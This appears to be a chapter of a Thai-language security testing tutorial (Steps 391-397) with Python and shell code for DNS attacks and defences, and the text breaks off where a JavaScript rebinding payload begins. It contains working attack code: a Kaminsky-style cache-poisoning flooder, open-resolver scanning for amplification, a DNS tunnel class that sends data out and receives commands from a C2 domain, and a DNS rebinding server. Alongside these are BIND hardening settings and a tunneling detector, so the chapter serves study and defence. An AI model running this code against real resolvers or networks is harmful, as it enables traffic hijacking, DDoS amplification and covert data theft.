# Part 40: DNS Security Testing (Steps 391-400)

## ภาพรวม
การทดสอปความปลอดภัยของระบบ DNS ครอบคลุม zone transfers, DNS cache poisoning, DNSSEC validation, DNS amplification, subdomain enumeration, DNS tunneling และ DNS-based attacks

---

## Step 391: DNS Reconnaissance และ Zone Transfer

```python
import dns.resolver
import dns.zone
import dns.query
import dns.exception
import dns.rdatatype
from typing import Dict, List, Optional
from dataclasses import dataclass

@dataclass
class DNSRecord:
    name: str
    record_type: str
    value: str
    ttl: int

class DNSRecon:
    """DNS Reconnaissance and Zone Transfer"""
    
    RECORD_TYPES = [
        'A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 
        'SRV', 'PTR', 'CAA', 'DNSKEY', 'DS', 'NSEC'
    ]
    
    def __init__(self, domain: str):
        self.domain = domain
        self.records = []
    
    def get_all_records(self) -> Dict[str, List[str]]:
        """ดึง DNS records ทุกประเภท"""
        all_records = {}
        
        for rtype in self.RECORD_TYPES:
            try:
                answers = dns.resolver.resolve(self.domain, rtype)
                all_records[rtype] = [str(r) for r in answers]
                print(f"{rtype}: {[str(r) for r in answers]}")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, 
                    dns.resolver.NoNameservers, dns.exception.Timeout):
                pass
            except Exception as e:
                pass
        
        return all_records
    
    def get_nameservers(self) -> List[str]:
        """ดึง nameservers ของ domain"""
        nameservers = []
        try:
            answers = dns.resolver.resolve(self.domain, 'NS')
            for ns in answers:
                nameservers.append(str(ns).rstrip('.'))
                print(f"NS: {ns}")
        except Exception as e:
            print(f"NS lookup error: {e}")
        return nameservers
    
    def attempt_zone_transfer(self) -> Optional[dns.zone.Zone]:
        """พยายาม AXFR zone transfer"""
        nameservers = self.get_nameservers()
        
        for ns in nameservers:
            try:
                # Resolve NS to IP
                ns_ips = dns.resolver.resolve(ns, 'A')
                for ns_ip in ns_ips:
                    try:
                        print(f"Trying AXFR from {ns} ({ns_ip})...")
                        zone = dns.zone.from_xfr(
                            dns.query.xfr(str(ns_ip), self.domain, timeout=10)
                        )
                        
                        if zone:
                            print(f"[!] ZONE TRANSFER SUCCESSFUL from {ns}!")
                            print(f"Found {len(zone.nodes)} records")
                            
                            for name, node in zone.nodes.items():
                                for rdataset in node.rdatasets:
                                    for rdata in rdataset:
                                        full_name = f"{name}.{self.domain}" if str(name) != '@' else self.domain
                                        print(f"  {full_name} {rdataset.rdtype} {rdata}")
                            
                            return zone
                    except Exception as e:
                        print(f"  AXFR failed from {ns_ip}: {e}")
            except Exception:
                pass
        
        print("Zone transfer not allowed (good configuration)")
        return None
    
    def brute_force_subdomains(self, wordlist: List[str]) -> List[str]:
        """ค้นหา subdomains ด้วย brute force"""
        found = []
        
        for word in wordlist:
            subdomain = f"{word}.{self.domain}"
            try:
                answers = dns.resolver.resolve(subdomain, 'A')
                ips = [str(r) for r in answers]
                found.append({'subdomain': subdomain, 'ips': ips})
                print(f"Found: {subdomain} -> {ips}")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                pass
            except Exception:
                pass
        
        return found
    
    def get_soa_info(self) -> Dict:
        """ดึง SOA record เพื่อหา primary nameserver"""
        try:
            answers = dns.resolver.resolve(self.domain, 'SOA')
            for soa in answers:
                info = {
                    'mname': str(soa.mname),
                    'rname': str(soa.rname),
                    'serial': soa.serial,
                    'refresh': soa.refresh,
                    'retry': soa.retry,
                    'expire': soa.expire,
                    'minimum': soa.minimum
                }
                print(f"SOA: {info}")
                return info
        except Exception as e:
            print(f"SOA error: {e}")
        return {}
    
    def reverse_lookup(self, ip_range: str) -> Dict[str, str]:
        """Reverse DNS lookup สำหรับ IP range"""
        import ipaddress
        results = {}
        
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
            for ip in list(network.hosts())[:254]:  # จำกัด /24
                try:
                    answers = dns.resolver.resolve(dns.reversename.from_address(str(ip)), 'PTR')
                    for ptr in answers:
                        results[str(ip)] = str(ptr)
                        print(f"PTR: {ip} -> {ptr}")
                except Exception:
                    pass
        except Exception as e:
            print(f"Error: {e}")
        
        return results


# dns_recon.sh
DNS_RECON_SCRIPT = '''
#!/bin/bash
# DNS Reconnaissance Script

DOMAIN="$1"
[[ -z "$DOMAIN" ]] && echo "Usage: $0 <domain>" && exit 1

echo "=== DNS Reconnaissance: $DOMAIN ==="

# Basic records
echo "\n[*] A Records:"
dig A "$DOMAIN" +short

echo "\n[*] MX Records:"
dig MX "$DOMAIN" +short

echo "\n[*] NS Records:"
dig NS "$DOMAIN" +short

echo "\n[*] TXT Records:"
dig TXT "$DOMAIN" +short

echo "\n[*] SOA Record:"
dig SOA "$DOMAIN"

# Zone transfer attempt
echo "\n[*] Zone Transfer Attempts:"
for NS in $(dig NS "$DOMAIN" +short); do
    echo "  Trying AXFR from $NS:"
    dig AXFR "$DOMAIN" @"$NS" 2>&1 | head -20
done

# dnsx for bulk resolution
echo "\n[*] Subdomain enumeration with dnsx:"
if command -v dnsx &>/dev/null; then
    cat /usr/share/wordlists/subdomains-top1million-5000.txt | \
        dnsx -d "$DOMAIN" -silent -a -resp -o /tmp/dns_results.txt
    echo "Results: $(wc -l < /tmp/dns_results.txt) subdomains found"
fi

# fierce
echo "\n[*] fierce DNS recon:"
fierce --domain "$DOMAIN" --subdomains /usr/share/fierce/hosts.txt 2>/dev/null | head -30

# dnsenum
echo "\n[*] dnsenum:"
dnsenum --noreverse "$DOMAIN" 2>/dev/null
'''
```

---

## Step 392: Subdomain Enumeration

```python
import asyncio
import aiohttp
import dns.resolver
import dns.exception
from typing import List, Dict, Set, Optional
import re
import json

class SubdomainEnumerator:
    """ค้นหา subdomains ด้วยหลายวิธี"""
    
    def __init__(self, domain: str):
        self.domain = domain
        self.found_subdomains: Set[str] = set()
    
    async def check_subdomain(self, session: aiohttp.ClientSession, 
                               subdomain: str) -> Optional[Dict]:
        """Async check สำหรับ subdomain"""
        fqdn = f"{subdomain}.{self.domain}"
        try:
            loop = asyncio.get_event_loop()
            answers = await loop.run_in_executor(
                None, 
                lambda: dns.resolver.resolve(fqdn, 'A')
            )
            ips = [str(r) for r in answers]
            return {'subdomain': fqdn, 'ips': ips, 'source': 'bruteforce'}
        except Exception:
            return None
    
    async def brute_force_async(self, wordlist: List[str], 
                                 concurrency: int = 50) -> List[Dict]:
        """เร็วขึ้นด้วย async brute force"""
        results = []
        semaphore = asyncio.Semaphore(concurrency)
        
        async def check_with_sem(sub):
            async with semaphore:
                result = await self.check_subdomain(None, sub)
                if result:
                    results.append(result)
                    self.found_subdomains.add(result['subdomain'])
                    print(f"Found: {result['subdomain']} -> {result['ips']}")
        
        tasks = [check_with_sem(sub) for sub in wordlist]
        await asyncio.gather(*tasks)
        return results
    
    def enumerate_via_certificate_transparency(self) -> List[str]:
        """ค้นหา subdomains ผ่าน Certificate Transparency logs"""
        subdomains = []
        
        # crt.sh API
        import urllib.request
        import json
        
        url = f'https://crt.sh/?q=%.{self.domain}&output=json'
        
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=30) as response:
                data = json.loads(response.read())
            
            seen = set()
            for cert in data:
                names = cert.get('name_value', '').split('\n')
                for name in names:
                    name = name.strip().lstrip('*.').lower()
                    if name.endswith(self.domain) and name not in seen:
                        seen.add(name)
                        subdomains.append(name)
            
            print(f"Found {len(subdomains)} subdomains via CT logs")
        except Exception as e:
            print(f"CT log error: {e}")
        
        return list(set(subdomains))
    
    def enumerate_via_google_dorks(self) -> List[str]:
        """ใช้ Google dorks หา subdomains (passive)"""
        dorks = [
            f'site:*.{self.domain}',
            f'site:{self.domain} -www',
        ]
        print("Google dorks to search manually:")
        for dork in dorks:
            print(f"  {dork}")
        return dorks
    
    def check_wildcard_dns(self) -> bool:
        """ตรวจสอบ wildcard DNS record"""
        import random
        import string
        
        random_sub = ''.join(random.choices(string.ascii_lowercase, k=16))
        test_domain = f"{random_sub}.{self.domain}"
        
        try:
            dns.resolver.resolve(test_domain, 'A')
            print(f"[!] Wildcard DNS detected! Random subdomain {test_domain} resolved!")
            return True
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            print("No wildcard DNS detected")
            return False
    
    def enumerate_from_dnsdumpster(self) -> List[str]:
        """ดึงข้อมูลจาก DNSDumpster (passive)"""
        # dnsdumpster.com API ต้องการ CSRF token
        # ใช้แทน tools เช่น amass, subfinder
        tools_guide = [
            f"amass enum -d {self.domain}",
            f"subfinder -d {self.domain} -o subdomains.txt",
            f"assetfinder --subs-only {self.domain}",
            f"findomain -t {self.domain}",
            f"knockpy {self.domain}",
        ]
        print("Recommended passive enumeration tools:")
        for cmd in tools_guide:
            print(f"  {cmd}")
        return tools_guide
    
    def resolve_and_verify(self, subdomains: List[str]) -> List[Dict]:
        """ตรวจสอบและ resolve subdomains"""
        verified = []
        
        for subdomain in subdomains:
            try:
                # A record
                a_records = []
                try:
                    answers = dns.resolver.resolve(subdomain, 'A')
                    a_records = [str(r) for r in answers]
                except Exception:
                    pass
                
                # CNAME
                cname = None
                try:
                    answers = dns.resolver.resolve(subdomain, 'CNAME')
                    cname = str(list(answers)[0])
                except Exception:
                    pass
                
                if a_records or cname:
                    entry = {
                        'subdomain': subdomain,
                        'a_records': a_records,
                        'cname': cname,
                        'takeover_risk': self._check_takeover_risk(cname)
                    }
                    verified.append(entry)
                    print(f"Verified: {subdomain} A={a_records} CNAME={cname}")
                    
            except Exception:
                pass
        
        return verified
    
    def _check_takeover_risk(self, cname: Optional[str]) -> bool:
        """ตรวจสอบ subdomain takeover risk"""
        if not cname:
            return False
        
        # จุดสิ้นสุดใน CNAME ที่อาจ takeover ได้
        takeover_services = [
            'github.io', 'herokuapp.com', 'shopify.com', 'readme.io',
            'freshdesk.com', 'zendesk.com', 'uservoice.com', 'ghost.io',
            'bitbucket.io', 'netlify.app', 'surge.sh', 'azurewebsites.net'
        ]
        
        for service in takeover_services:
            if service in cname:
                try:
                    dns.resolver.resolve(cname.rstrip('.'), 'A')
                    return False  # Resolves = not vulnerable
                except dns.resolver.NXDOMAIN:
                    print(f"[!] POSSIBLE TAKEOVER: {cname} (NXDOMAIN)")
                    return True
        
        return False
```

---

## Step 393: DNS Cache Poisoning

```python
import socket
import struct
import random
import threading
from typing import Optional, Tuple

class DNSCachePoisoning:
    """DNS Cache Poisoning attack demonstration"""
    
    def __init__(self):
        self.dns_port = 53
    
    def build_dns_query(self, query_id: int, domain: str, 
                         qtype: int = 1) -> bytes:
        """Build DNS query packet"""
        # Header
        header = struct.pack('!HHHHHH',
            query_id,   # ID
            0x0100,     # Flags: Standard query, recursion desired
            1,          # QDCOUNT: 1 question
            0,          # ANCOUNT
            0,          # NSCOUNT
            0           # ARCOUNT
        )
        
        # Question section
        question = b''
        for label in domain.split('.'):
            question += struct.pack('B', len(label)) + label.encode()
        question += b'\x00'  # Root label
        question += struct.pack('!HH', qtype, 1)  # QTYPE=A, QCLASS=IN
        
        return header + question
    
    def build_dns_response(self, query_id: int, domain: str,
                            spoofed_ip: str, ttl: int = 300) -> bytes:
        """Build forged DNS response packet"""
        # Header
        header = struct.pack('!HHHHHH',
            query_id,
            0x8180,   # Response, recursion available
            1,        # QDCOUNT
            1,        # ANCOUNT: 1 answer
            0,        # NSCOUNT
            0         # ARCOUNT
        )
        
        # Question section
        question = b''
        for label in domain.split('.'):
            question += struct.pack('B', len(label)) + label.encode()
        question += b'\x00'
        question += struct.pack('!HH', 1, 1)  # A, IN
        
        # Answer section
        answer = b'\xc0\x0c'  # Pointer to domain name in question
        answer += struct.pack('!HH', 1, 1)   # TYPE=A, CLASS=IN
        answer += struct.pack('!I', ttl)      # TTL
        answer += struct.pack('!H', 4)        # RDLENGTH
        answer += socket.inet_aton(spoofed_ip)  # RDATA
        
        return header + question + answer
    
    def kaminsky_attack_simulation(self, target_resolver: str, 
                                    target_domain: str,
                                    spoofed_ip: str) -> bool:
        """
        Simulate Kaminsky DNS Cache Poisoning attack
        ความเสี่ยง: โจมตี DNS cache โดยใช้ random subdomains
        """
        print(f"Simulating Kaminsky attack against {target_resolver}")
        print(f"Target domain: {target_domain}")
        print(f"Spoofed IP: {spoofed_ip}")
        
        # Source port randomization era: predict or brute force
        # Modern attack requires:
        # 1. Query for random subdomain.target.com
        # 2. Send many forged responses with different TXIDs
        # 3. Response includes NS record for target.com -> attacker
        # 4. Repeat until we get lucky (win the race)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        
        attempts = 0
        max_attempts = 100
        
        while attempts < max_attempts:
            # Random subdomain to bypass negative caching
            random_sub = f"x{random.randint(10000, 99999)}.{target_domain}"
            
            # Step 1: Send query
            query_id = random.randint(1, 65535)
            query = self.build_dns_query(query_id, random_sub)
            
            try:
                sock.sendto(query, (target_resolver, 53))
                
                # Step 2: Flood with forged responses
                for txid in range(1, 65536, 100):  # Try 655 different IDs
                    forged = self.build_dns_response(
                        txid, random_sub, spoofed_ip
                    )
                    sock.sendto(forged, (target_resolver, 53))
                
                # Check if poisoning succeeded
                try:
                    check_query = self.build_dns_query(
                        random.randint(1, 65535), target_domain
                    )
                    sock.sendto(check_query, (target_resolver, 53))
                    response, _ = sock.recvfrom(512)
                    
                    # Parse response IP
                    ip_offset = len(response) - 4
                    response_ip = socket.inet_ntoa(response[ip_offset:])
                    
                    if response_ip == spoofed_ip:
                        print(f"[!] Cache poisoning successful after {attempts} attempts!")
                        sock.close()
                        return True
                except Exception:
                    pass
                
            except Exception as e:
                pass
            
            attempts += 1
        
        sock.close()
        print(f"Attack failed after {max_attempts} attempts")
        return False
    
    def detect_cache_poisoning(self, resolver: str, domain: str, 
                                expected_ip: str) -> bool:
        """ตรวจหาว่า DNS cache ถูก poison หรือไม่"""
        try:
            custom_resolver = dns.resolver.Resolver(configure=False)
            custom_resolver.nameservers = [resolver]
            
            answers = custom_resolver.resolve(domain, 'A')
            resolved_ip = str(list(answers)[0])
            
            if resolved_ip != expected_ip:
                print(f"[ALERT] Possible cache poisoning!")
                print(f"  Expected: {expected_ip}")
                print(f"  Got: {resolved_ip}")
                return True
            else:
                print(f"DNS response looks correct: {domain} -> {resolved_ip}")
                return False
        except Exception as e:
            print(f"Error: {e}")
            return False


# Defenses against DNS cache poisoning
DNS_DEFENSE_CONFIG = '''
# BIND9 configuration - DNS cache poisoning defenses

options {
    // Source port randomization (CRITICAL)
    use-v4-udpport-range 1024 65535;
    use-v6-udpport-range 1024 65535;
    
    // 0x20 encoding (case randomization)
    // Note: Requires BIND 9.11+
    
    // Rate limiting to prevent amplification
    rate-limit {
        responses-per-second 10;
        referrals-per-second 5;
        nodata-per-second 5;
        errors-per-second 5;
        nxdomains-per-second 5;
        slip 2;
        window 15;
    };
    
    // Disable recursion for public-facing servers
    allow-recursion { 192.168.0.0/16; 10.0.0.0/8; };
    
    // Response Rate Limiting
    minimal-responses yes;
    
    // DNSSEC validation
    dnssec-validation auto;
    dnssec-enable yes;
    
    // Disable zone transfers to non-authorized servers
    allow-transfer { none; };
    
    // Query logging
    querylog yes;
};

// PowerDNS dnsdist config for RRL
setMaxUDPOutstanding(10240)
newServer({address="8.8.8.8:53", pool="recursive"})
addACL("192.168.0.0/16")
'''
```

---

## Step 394: DNSSEC Testing

```python
import dns.resolver
import dns.dnssec
import dns.name
import dns.rdatatype
from typing import Dict, List, Optional

class DNSSECTester:
    """ทดสอบ DNSSEC implementation"""
    
    def check_dnssec_enabled(self, domain: str) -> Dict:
        """ตรวจสอบว่า domain ใช้ DNSSEC หรือไม่"""
        result = {
            'domain': domain,
            'dnskey': None,
            'ds': None,
            'rrsig': None,
            'nsec_nsec3': None,
            'signed': False,
            'chain_of_trust': False,
            'issues': []
        }
        
        # Check DNSKEY record
        try:
            answers = dns.resolver.resolve(domain, 'DNSKEY')
            keys = []
            for key in answers:
                key_info = {
                    'flags': key.flags,
                    'protocol': key.protocol,
                    'algorithm': key.algorithm,
                    'key_tag': dns.dnssec.key_tag(key)
                }
                keys.append(key_info)
                
                # Check if KSK (bit 7 set in flags)
                if key.flags & 0x0001:
                    print(f"KSK found: key_tag={key_info['key_tag']}, alg={key_info['algorithm']}")
                else:
                    print(f"ZSK found: key_tag={key_info['key_tag']}, alg={key_info['algorithm']}")
            
            result['dnskey'] = keys
            result['signed'] = True
        except dns.resolver.NoAnswer:
            result['issues'].append('No DNSKEY record - DNSSEC not implemented')
        except Exception as e:
            result['issues'].append(f'DNSKEY error: {e}')
        
        # Check DS record at parent
        parent_domain = '.'.join(domain.split('.')[1:])
        try:
            answers = dns.resolver.resolve(domain, 'DS')
            ds_records = []
            for ds in answers:
                ds_info = {
                    'key_tag': ds.key_tag,
                    'algorithm': ds.algorithm,
                    'digest_type': ds.digest_type
                }
                ds_records.append(ds_info)
                
                if ds.digest_type == 1:
                    result['issues'].append(f'DS uses SHA-1 (digest_type=1) - should use SHA-256')
            
            result['ds'] = ds_records
            result['chain_of_trust'] = True
        except dns.resolver.NoAnswer:
            result['issues'].append('No DS record in parent zone - chain of trust broken!')
        except Exception as e:
            result['issues'].append(f'DS error: {e}')
        
        # Check RRSIG
        try:
            answers = dns.resolver.resolve(domain, 'A', want_dnssec=True)
            rrset, rrsig = answers.response.answer[:2] if len(answers.response.answer) >= 2 else (None, None)
            if rrsig:
                result['rrsig'] = 'Present'
        except Exception:
            pass
        
        # Check for NSEC/NSEC3
        try:
            # Query for non-existent name to trigger NSEC
            nx_domain = f'nonexistent12345.{domain}'
            try:
                dns.resolver.resolve(nx_domain, 'A')
            except dns.resolver.NXDOMAIN as e:
                response = e.response()
                if response:
                    for rrset in response.authority:
                        if rrset.rdtype == dns.rdatatype.NSEC:
                            result['nsec_nsec3'] = 'NSEC'
                        elif rrset.rdtype == dns.rdatatype.NSEC3:
                            result['nsec_nsec3'] = 'NSEC3'
        except Exception:
            pass
        
        return result
    
    def check_algorithm_strength(self, algorithm: int) -> str:
        """ประเมินความแข็งของ DNSSEC algorithm"""
        algorithms = {
            1: ('RSA/MD5', 'DEPRECATED'),
            3: ('DSA/SHA1', 'DEPRECATED'),
            5: ('RSA/SHA-1', 'WEAK'),
            6: ('DSA-NSEC3-SHA1', 'DEPRECATED'),
            7: ('RSASHA1-NSEC3-SHA1', 'WEAK'),
            8: ('RSA/SHA-256', 'GOOD'),
            10: ('RSA/SHA-512', 'GOOD'),
            12: ('ECC-GOST', 'NOT RECOMMENDED'),
            13: ('ECDSA P-256/SHA-256', 'RECOMMENDED'),
            14: ('ECDSA P-384/SHA-384', 'RECOMMENDED'),
            15: ('Ed25519', 'RECOMMENDED'),
            16: ('Ed448', 'RECOMMENDED'),
        }
        
        info = algorithms.get(algorithm, (f'Unknown ({algorithm})', 'UNKNOWN'))
        return f'{info[0]} [{info[1]}]'
    
    def test_dnssec_validation(self, domain: str) -> bool:
        """ทดสอบว่า resolver ใช้งาน DNSSEC validation"""
        # ใช้ SERVFAIL.nl (always fails DNSSEC)
        test_domains = {
            'dnssec-failed.org': 'Should FAIL (bogus DNSSEC)',
            'dnssec.works': 'Should SUCCEED (valid DNSSEC)',
        }
        
        results = {}
        for test_domain, expected in test_domains.items():
            try:
                dns.resolver.resolve(test_domain, 'A')
                results[test_domain] = {'resolved': True, 'expected': expected}
            except dns.resolver.NXDOMAIN:
                results[test_domain] = {'resolved': False, 'error': 'NXDOMAIN', 'expected': expected}
            except Exception as e:
                results[test_domain] = {'resolved': False, 'error': str(e), 'expected': expected}
        
        return results


# dig dnssec commands
DNSSEC_COMMANDS = '''
# Check DNSSEC with dig

# Check DNSKEY
dig DNSKEY example.com +dnssec

# Check DS record
dig DS example.com @8.8.8.8

# Validate full chain
dig +sigchase +trusted-key=./root.key example.com A

# Check if zone is signed
dig +dnssec example.com SOA

# Test with delv (modern DNSSEC validator)
delv @8.8.8.8 example.com A +rtrace

# Check for NSEC3
dig NSEC3PARAM example.com

# Verify RRSIG
dig A example.com +dnssec +multiline | grep RRSIG

# Test bogus DNSSEC response
dig +dnssec dnssec-failed.org A @8.8.8.8
'''
```

---

## Step 395: DNS Amplification Attack Testing

```python
import socket
import struct
import random
from typing import List, Dict, Tuple

class DNSAmplificationTester:
    """ทดสอบความเสี่ยง DNS amplification"""
    
    def calculate_amplification_factor(self, resolver: str, query_domain: str) -> Dict:
        """คำนวณ amplification factor"""
        result = {
            'resolver': resolver,
            'domain': query_domain,
            'query_size': 0,
            'response_size': 0,
            'amplification_factor': 0,
            'any_response': False
        }
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        
        try:
            # Build small DNS ANY query
            query_id = random.randint(1, 65535)
            query = self._build_any_query(query_id, query_domain)
            result['query_size'] = len(query)
            
            sock.sendto(query, (resolver, 53))
            response, _ = sock.recvfrom(65535)
            result['response_size'] = len(response)
            result['any_response'] = True
            
            if result['query_size'] > 0:
                result['amplification_factor'] = result['response_size'] / result['query_size']
                print(f"Amplification: {result['amplification_factor']:.1f}x "
                      f"({result['query_size']}B -> {result['response_size']}B)")
        except socket.timeout:
            print(f"Timeout from {resolver}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            sock.close()
        
        return result
    
    def _build_any_query(self, query_id: int, domain: str) -> bytes:
        """Build DNS ANY query (maximum amplification)"""
        header = struct.pack('!HHHHHH',
            query_id,
            0x0100,  # RD=1
            1,       # QDCOUNT
            0, 0, 0
        )
        
        question = b''
        for label in domain.split('.'):
            question += struct.pack('B', len(label)) + label.encode()
        question += b'\x00'
        question += struct.pack('!HH', 255, 1)  # QTYPE=ANY, QCLASS=IN
        
        return header + question
    
    def find_open_resolvers(self, ip_ranges: List[str]) -> List[str]:
        """ค้นหา open DNS resolvers"""
        import ipaddress
        open_resolvers = []
        
        test_domain = 'google.com'
        query_id = random.randint(1, 65535)
        query = self._build_any_query(query_id, test_domain)
        
        for ip_range in ip_ranges:
            try:
                network = ipaddress.ip_network(ip_range, strict=False)
                for ip in list(network.hosts())[:256]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    try:
                        sock.sendto(query, (str(ip), 53))
                        response, _ = sock.recvfrom(4096)
                        if len(response) > 0:
                            open_resolvers.append(str(ip))
                            print(f"Open resolver: {ip}")
                    except Exception:
                        pass
                    finally:
                        sock.close()
            except Exception:
                pass
        
        return open_resolvers
    
    def test_rate_limiting(self, resolver: str) -> Dict:
        """ทดสอบว่า resolver มี rate limiting หรือไม่"""
        result = {'has_rate_limiting': False, 'limit_per_second': None}
        
        query_id = random.randint(1, 65535)
        query = self._build_any_query(query_id, 'google.com')
        
        responses = 0
        errors = 0
        total = 100
        
        for i in range(total):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            try:
                sock.sendto(query, (resolver, 53))
                response, _ = sock.recvfrom(4096)
                responses += 1
            except socket.timeout:
                errors += 1  # Possible rate limiting
            except Exception:
                errors += 1
            finally:
                sock.close()
        
        if errors > total * 0.3:
            result['has_rate_limiting'] = True
            result['limit_per_second'] = responses
            print(f"Rate limiting detected: {responses}/{total} succeeded")
        else:
            print(f"No rate limiting detected: {responses}/{total} succeeded")
        
        return result


# Mitigation measures
DNS_AMPLI_MITIGATIONS = '''
# DNS Amplification Attack Mitigations

# 1. BCP38 (Source Address Validation) at ISP level
#    Cannot spoof source IP if ISP filters it

# 2. Rate Limiting in BIND9
rate-limit {
    responses-per-second 5;
    referrals-per-second 5;
    nodata-per-second 5;
    nxdomains-per-second 5;
    errors-per-second 5;
    slip 2;
    window 15;
    max-table-size 20000;
    min-table-size 500;
    ipv4-prefix-length 24;
    ipv6-prefix-length 56;
};

# 3. Disable ANY queries (modern BIND)
minimal-any yes;  # BIND 9.11+

# 4. Disable recursion for non-authorized clients
allow-recursion { localhost; internal_nets; };
recursion no;  # On authoritative servers

# 5. PowerDNS RRL
# pdns.conf:
# rrl-requests-per-second=5
# rrl-errors-per-second=5

# 6. iptables rate limiting
iptables -A INPUT -p udp --dport 53 -m hashlimit \\
  --hashlimit-name dns \\
  --hashlimit-above 20/sec \\
  --hashlimit-burst 100 \\
  --hashlimit-mode srcip \\
  -j DROP
'''
```

---

## Step 396: DNS Tunneling Detection และ Implementation

```python
import base64
import dns.resolver
import dns.message
import dns.rdatatype
import socket
import struct
import hashlib
import time
from typing import Optional, Generator, List

class DNSTunnel:
    """
    DNS Tunneling - ส่งข้อมูลผ่าน DNS queries
    ใช้สำหรับการทดสอบและการสาธิต C2 เท่านั้น
    """
    
    MAX_LABEL_LENGTH = 63
    MAX_QUERY_LENGTH = 253
    CHUNK_SIZE = 40  # bytes per DNS label
    
    def __init__(self, c2_domain: str, resolver: str = '8.8.8.8'):
        self.c2_domain = c2_domain
        self.resolver = resolver
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    def encode_data(self, data: bytes) -> str:
        """Encode data สำหรับ DNS transmission"""
        return base64.b32encode(data).decode().replace('=', '').lower()
    
    def decode_data(self, encoded: str) -> bytes:
        """Decode data จาก DNS response"""
        # Add padding back
        padding = 8 - len(encoded) % 8
        if padding != 8:
            encoded += '=' * padding
        return base64.b32decode(encoded.upper())
    
    def send_data(self, data: bytes) -> List[str]:
        """ส่งข้อมูลผ่าน DNS TXT queries"""
        encoded = self.encode_data(data)
        queries_sent = []
        
        # Split into chunks that fit in DNS label
        for i in range(0, len(encoded), self.CHUNK_SIZE):
            chunk = encoded[i:i+self.CHUNK_SIZE]
            chunk_idx = i // self.CHUNK_SIZE
            
            # Format: <chunk_idx>.<chunk>.<session_id>.c2.domain.com
            query = f"{chunk_idx}.{chunk}.{self.session_id}.{self.c2_domain}"
            
            if len(query) <= self.MAX_QUERY_LENGTH:
                queries_sent.append(query)
                print(f"Tunnel query: {query}")
                
                # Send the DNS query
                try:
                    dns.resolver.resolve(query, 'TXT')
                except Exception:
                    pass  # Expected - just need the query to reach server
        
        return queries_sent
    
    def receive_data(self, domain: str) -> Optional[bytes]:
        """รับข้อมูลผ่าน DNS TXT responses"""
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata).strip('"')
                return self.decode_data(txt)
        except Exception as e:
            return None
    
    def receive_command(self) -> Optional[str]:
        """รับคำสั่งจาก C2 เซิ༌ยฟ DNS"""
        cmd_domain = f"cmd.{self.session_id}.{self.c2_domain}"
        data = self.receive_data(cmd_domain)
        if data:
            return data.decode('utf-8', errors='ignore')
        return None


class DNSTunnelDetector:
    """Detection of DNS tunneling"""
    
    def analyze_dns_traffic(self, dns_logs: List[Dict]) -> Dict:
        """วิเคราะห์ DNS logs หา tunneling"""
        alerts = []
        stats = {
            'total_queries': len(dns_logs),
            'unique_domains': set(),
            'high_entropy_queries': [],
            'long_queries': [],
            'high_volume_domains': {},
            'txt_queries': [],
        }
        
        for log in dns_logs:
            query = log.get('query', '')
            qtype = log.get('type', 'A')
            client = log.get('client', '')
            
            stats['unique_domains'].add(query)
            
            # Check query length
            if len(query) > 100:
                stats['long_queries'].append(query)
            
            # Check entropy (high entropy = encoded data)
            entropy = self._calculate_entropy(query)
            if entropy > 3.8:
                stats['high_entropy_queries'].append({
                    'query': query,
                    'entropy': entropy
                })
            
            # Track TXT queries (used by DNS tunnels)
            if qtype == 'TXT':
                stats['txt_queries'].append(query)
            
            # Count queries per domain
            domain_parts = query.split('.')
            if len(domain_parts) >= 2:
                base_domain = '.'.join(domain_parts[-2:])
                stats['high_volume_domains'][base_domain] = \
                    stats['high_volume_domains'].get(base_domain, 0) + 1
        
        # Generate alerts
        if len(stats['long_queries']) > 10:
            alerts.append(f"{len(stats['long_queries'])} queries > 100 chars (possible tunneling)")
        
        if len(stats['high_entropy_queries']) > 5:
            alerts.append(f"{len(stats['high_entropy_queries'])} high-entropy queries")
        
        for domain, count in stats['high_volume_domains'].items():
            if count > 100:
                alerts.append(f"High query volume to {domain}: {count} queries")
        
        if len(stats['txt_queries']) > 20:
            alerts.append(f"{len(stats['txt_queries'])} TXT queries (unusual)")
        
        stats['unique_domains'] = len(stats['unique_domains'])
        stats['alerts'] = alerts
        
        return stats
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy"""
        import math
        if not text:
            return 0
        
        freq = {}
        for c in text:
            freq[c] = freq.get(c, 0) + 1
        
        entropy = 0
        for count in freq.values():
            p = count / len(text)
            if p > 0:
                entropy -= p * math.log2(p)
        
        return entropy
```

---

## Step 397: DNS Rebinding Attack

```python
import socket
import threading
import time
import http.server
from typing import Dict, Optional

class DNSRebindingServer:
    """
    DNS Rebinding attack server
    เปลี่ยน DNS response จาก attacker IP -> internal IP
    เพื่อ bypass Same-Origin Policy
    """
    
    def __init__(self, attacker_ip: str, internal_ip: str, 
                 domain: str, ttl: int = 1):
        self.attacker_ip = attacker_ip
        self.internal_ip = internal_ip
        self.domain = domain
        self.ttl = ttl  # Very short TTL for rebinding
        self.request_count = {}
        self.rebind_threshold = 2  # Rebind after 2nd request
    
    def handle_dns_query(self, domain: str, client_ip: str) -> str:
        """ตอบ DNS query ด้วย IP ที่ถูกต้อง"""
        count = self.request_count.get(client_ip, 0)
        self.request_count[client_ip] = count + 1
        
        if count < self.rebind_threshold:
            # First requests: return attacker IP
            # Browser downloads malicious JS
            print(f"[DNS] Returning attacker IP to {client_ip} (count={count})")
            return self.attacker_ip
        else:
            # After threshold: return internal IP
            # Browser re-resolves and JS can now access internal IP
            print(f"[DNS] REBINDING: Returning internal IP to {client_ip}")
            return self.internal_ip
    
    def generate_malicious_js(self) -> str:
        """Generate JavaScript payload for DNS rebinding"""
        return f"""
// DNS Rebinding Attack Payload
// This runs in victim's browser after DNS rebinding

async function dnsRebindingAttack() {{
